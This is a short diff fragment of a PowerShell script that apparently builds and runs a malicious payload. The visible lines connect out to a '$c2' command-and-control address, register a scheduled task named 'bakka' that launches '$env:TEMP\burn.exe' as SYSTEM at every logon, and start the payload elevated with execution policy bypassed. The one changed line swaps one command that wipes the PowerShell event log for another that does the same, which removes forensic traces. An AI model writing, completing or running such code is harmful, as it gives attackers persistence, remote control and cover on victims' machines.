@@ -11,7 +11,7 @@ $client = New-Object System.Net.Sockets.TcpClient
 $client.Connect($c2.Split(':')[0], [int]$c2.Split(':')[1])
 $client.Close()
 schtasks /create /sc onlogon /tn "bakka" /tr "$env:TEMP\burn.exe" /ru SYSTEM
-Clear-EventLog -LogName PowerShell
+wevtutil cl PowerShell
 '@
 $payload | Out-File -FilePath $scriptPath -Encoding UTF8
 Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
